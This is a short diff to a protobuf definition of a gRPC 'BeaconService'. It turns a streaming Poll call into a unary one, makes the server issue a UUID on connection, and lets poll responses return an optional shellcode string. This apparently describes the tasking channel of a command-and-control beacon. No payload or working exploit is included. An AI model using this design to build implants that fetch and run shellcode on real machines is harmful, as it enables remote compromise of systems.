@@ -6,21 +6,23 @@ service BeaconService {
   rpc Connection(ConnectionRequest) returns (ConnectionResponse);
 
   // Poll establishes a stream of tasks and status.
-  rpc Poll(stream PollRequest) returns (stream PollResponse);
+  rpc Poll(PollRequest) returns (PollResponse);
 }
 
-message ConnectionRequest {
-  uint32 id = 1;
-}
+message ConnectionRequest {}
 
-message ConnectionResponse {}
+message ConnectionResponse {
+  string uuid = 1;
+}
 
 message PollRequest {
-  Status status = 1;
+  string uuid = 1;
+  // Status status = 2;
 }
 
 message PollResponse {
-  ShellCode shellcode = 1;
+  optional string shellcode = 1;
+  // optional ShellCode shellcode = 1;
 }
 
 message Status {
